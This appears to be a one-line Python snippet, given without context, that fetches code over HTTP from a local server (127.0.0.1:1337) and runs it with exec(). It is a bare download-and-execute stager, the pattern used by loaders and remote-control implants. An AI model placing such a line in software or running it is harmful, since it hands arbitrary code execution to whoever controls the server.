import requests; exec(requests.get("http://127.0.0.1:1337/").content.decode())
